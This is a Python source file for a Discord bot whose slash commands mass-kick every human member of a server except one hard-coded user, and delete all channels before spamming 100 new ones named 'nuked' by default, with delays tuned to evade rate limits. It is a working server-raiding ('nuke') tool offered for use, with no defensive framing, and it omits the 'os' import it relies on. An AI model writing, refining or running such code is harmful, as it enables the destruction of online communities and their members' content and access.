import discord
from discord.ext import commands
from discord import app_commands
import asyncio

# CONFIGURATION - Add your Discord user ID here
AUTHORIZED_USER_ID = 123456789012345678  # Replace with your actual Discord user ID

# Bot setup with required intents
intents = discord.Intents.default()
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

def is_authorized(interaction: discord.Interaction) -> bool:
    """Check if user is authorized to use destructive commands"""
    return interaction.user.id == AUTHORIZED_USER_ID

@bot.event
async def on_ready():
    print(f'Bot is ready! Logged in as {bot.user}')
    print(f'Authorized User ID: {AUTHORIZED_USER_ID}')
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} command(s)")
    except Exception as e:
        print(f"Failed to sync commands: {e}")

@bot.tree.command(name="kickall", description="Kick all members from the server (Authorized users only)")
async def kickall(interaction: discord.Interaction):
    # Check authorization
    if not is_authorized(interaction):
        await interaction.response.send_message(
            "❌ You are not authorized to use this command!",
            ephemeral=True
        )
        return
    
    # Defer the response since this will take time
    await interaction.response.defer(ephemeral=True)
    
    # Get all members except bots and the authorized user
    members_to_kick = [
        member for member in interaction.guild.members
        if not member.bot and member.id != AUTHORIZED_USER_ID
    ]
    
    kicked_count = 0
    failed_count = 0
    
    await interaction.followup.send(
        f"🚀 Starting to kick {len(members_to_kick)} members...",
        ephemeral=True
    )
    
    # Kick each member with rate limit handling
    for member in members_to_kick:
        try:
            await member.kick(reason=f"Mass kick by authorized user")
            kicked_count += 1
            
            # Delay to avoid rate limits (adjust as needed)
            await asyncio.sleep(0.5)
            
        except discord.Forbidden:
            failed_count += 1
            print(f"Failed to kick {member.name} - Missing permissions")
        except discord.HTTPException as e:
            failed_count += 1
            print(f"Failed to kick {member.name} - {e}")
    
    # Send final report
    await interaction.followup.send(
        f"✅ Kick completed!\n"
        f"Successfully kicked: {kicked_count}\n"
        f"Failed to kick: {failed_count}",
        ephemeral=True
    )

@bot.tree.command(name="channelcreate", description="Delete all channels and create 100 new channels")
@app_commands.describe(channel_name="Name for the new channels (default: 'nuked')")
async def channelcreate(interaction: discord.Interaction, channel_name: str = "nuked"):
    # Check authorization
    if not is_authorized(interaction):
        await interaction.response.send_message(
            "❌ You are not authorized to use this command!",
            ephemeral=True
        )
        return
    
    # Defer the response
    await interaction.response.defer(ephemeral=True)
    
    guild = interaction.guild
    
    # Step 1: Delete all existing channels
    existing_channels = guild.channels
    deleted_count = 0
    delete_failed = 0
    
    await interaction.followup.send(
        f"🗑️ Deleting {len(existing_channels)} existing channels...",
        ephemeral=True
    )
    
    for channel in existing_channels:
        try:
            await channel.delete(reason="Channel nuke by authorized user")
            deleted_count += 1
            await asyncio.sleep(0.3)  # Rate limit avoidance
        except discord.Forbidden:
            delete_failed += 1
            print(f"Failed to delete {channel.name} - Missing permissions")
        except discord.HTTPException as e:
            delete_failed += 1
            print(f"Failed to delete {channel.name} - {e}")
    
    await interaction.followup.send(
        f"✅ Deleted {deleted_count} channels (Failed: {delete_failed})\n"
        f"🏗️ Creating 100 new channels named '{channel_name}'...",
        ephemeral=True
    )
    
    # Step 2: Create 100 new channels
    created_count = 0
    create_failed = 0
    
    for i in range(100):
        try:
            await guild.create_text_channel(
                name=channel_name,
                reason="Mass channel creation by authorized user"
            )
            created_count += 1
            
            # Rate limit handling - Discord allows ~50 channels per 10 seconds
            if (i + 1) % 10 == 0:
                await asyncio.sleep(2)  # Longer delay every 10 channels
            else:
                await asyncio.sleep(0.2)  # Short delay between channels
                
        except discord.Forbidden:
            create_failed += 1
            print(f"Failed to create channel {i+1} - Missing permissions")
        except discord.HTTPException as e:
            create_failed += 1
            print(f"Failed to create channel {i+1} - {e}")
            # If we hit rate limit, wait longer
            if "rate limit" in str(e).lower():
                await asyncio.sleep(5)
    
    # Final report
    await interaction.followup.send(
        f"✅ Channel operation completed!\n\n"
        f"**Deletion:**\n"
        f"Deleted: {deleted_count}\n"
        f"Failed: {delete_failed}\n\n"
        f"**Creation:**\n"
        f"Created: {created_count}\n"
        f"Failed: {create_failed}",
        ephemeral=True
    )

# Run the bot
TOKEN = os.getenv("DISCORD_TOKEN")

bot.run(TOKEN)
